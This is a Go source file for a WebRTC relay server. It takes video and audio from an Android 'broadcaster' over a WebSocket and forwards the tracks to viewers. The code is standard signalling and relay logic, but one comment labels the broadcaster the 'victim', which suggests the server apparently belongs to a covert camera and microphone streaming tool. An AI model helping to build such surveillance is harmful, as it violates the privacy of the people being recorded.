package webrtc

import (
	"encoding/json"
	"log"
	"os"
	"sync"

	"github.com/gofiber/websocket/v2"
	"github.com/pion/webrtc/v3"
)

// Room represents a WebRTC session
type Room struct {
	Peers     *Peers
	LastOffer string
}

// Handles a broadcaster (victim) WebSocket
func RoomConn(c *websocket.Conn, p *Peers, room *Room) {
	config := webrtc.Configuration{}
	if os.Getenv("ENVIRONMENT") == "PRODUCTION" {
		config = turnConfig
	}

	pc, err := webrtc.NewPeerConnection(config)
	if err != nil {
		log.Println("PeerConnection creation failed:", err)
		return
	}
	defer pc.Close()

	// We will RECEIVE media from broadcaster
	for _, typ := range []webrtc.RTPCodecType{webrtc.RTPCodecTypeVideo, webrtc.RTPCodecTypeAudio} {
		if _, err := pc.AddTransceiverFromKind(typ, webrtc.RTPTransceiverInit{
			Direction: webrtc.RTPTransceiverDirectionRecvonly,
		}); err != nil {
			log.Println("AddTransceiver error:", err)
			return
		}
	}

	newPeer := PeerConnectionState{
		PeerConnection: pc,
		Websocket: &ThreadSafeWriter{
			Conn:  c,
			Mutex: sync.Mutex{},
		},
		Role: "broadcaster",
	}

	// Register peer
	p.ListLock.Lock()
	p.Connections = append(p.Connections, newPeer)
	p.ListLock.Unlock()
	log.Println("New broadcaster connected. Total peers:", len(p.Connections))

	// Send ICE candidates to broadcaster as JSON
	pc.OnICECandidate(func(i *webrtc.ICECandidate) {
		if i == nil {
			return
		}
		candJSON, err := json.Marshal(i.ToJSON())
		if err != nil {
			log.Println("ICE candidate marshal error:", err)
			return
		}
		if err := newPeer.Websocket.WriteJSON(&websocketMessage{
			Event: "candidate",
			Data:  string(candJSON),
		}); err != nil {
			log.Println("Send candidate error:", err)
		}
	})

	pc.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		log.Printf("Broadcaster PC state: %s", state.String())
		switch state {
		case webrtc.PeerConnectionStateFailed:
			_ = pc.Close()
		case webrtc.PeerConnectionStateClosed:
			p.SignalPeerConnections(room)
		}
	})

	// Forward incoming media to TrackLocals
	pc.OnTrack(func(t *webrtc.TrackRemote, _ *webrtc.RTPReceiver) {
		log.Printf("Received broadcaster track: %s (%s)", t.ID(), t.Kind().String())

		trackLocal := p.AddTrack(t, room)
		if trackLocal == nil {
			log.Println("Failed to create local track")
			return
		}
		defer p.RemoveTrack(trackLocal, room)

		buf := make([]byte, 1500)
		for {
			n, _, err := t.Read(buf)
			if err != nil {
				log.Println("Remote track read error:", err)
				return
			}
			if _, err = trackLocal.Write(buf[:n]); err != nil {
				log.Println("Local track write error:", err)
				return
			}
		}
	})

	// After the broadcaster is ready, try to sync viewers
	p.SignalPeerConnections(room)

	// Handle incoming WS messages
	for {
		_, raw, err := c.ReadMessage()
		if err != nil {
			log.Println("Broadcaster WS read error:", err)
			return
		}

		var msg websocketMessage
		if err := json.Unmarshal(raw, &msg); err != nil {
			log.Println("Broadcaster WS unmarshal error:", err)
			return
		}

		switch msg.Event {
		case "candidate":
			// Android sends JSON; but accept plain too
			var candInit webrtc.ICECandidateInit
			if err := json.Unmarshal([]byte(msg.Data), &candInit); err != nil {
				// fallback: treat as plain candidate string
				candInit = webrtc.ICECandidateInit{Candidate: msg.Data}
			}
			if err := pc.AddICECandidate(candInit); err != nil {
				log.Println("AddICECandidate error:", err)
				return
			}

		case "offer":
			// Android sends plain SDP string for offer
			offer := webrtc.SessionDescription{Type: webrtc.SDPTypeOffer, SDP: msg.Data}
			if err := pc.SetRemoteDescription(offer); err != nil {
				log.Println("SetRemoteDescription(offer) error:", err)
				return
			}
			answer, err := pc.CreateAnswer(nil)
			if err != nil {
				log.Println("CreateAnswer error:", err)
				return
			}
			if err := pc.SetLocalDescription(answer); err != nil {
				log.Println("SetLocalDescription(answer) error:", err)
				return
			}
			// Send back plain SDP string
			if err := newPeer.Websocket.WriteJSON(&websocketMessage{
				Event: "answer",
				Data:  answer.SDP,
			}); err != nil {
				log.Println("Send answer error:", err)
				return
			}

		case "answer":
			// Not expected from broadcaster
			log.Println("Unexpected answer from broadcaster; ignoring")

		default:
			log.Println("Unknown event from broadcaster:", msg.Event)
		}
	}
}
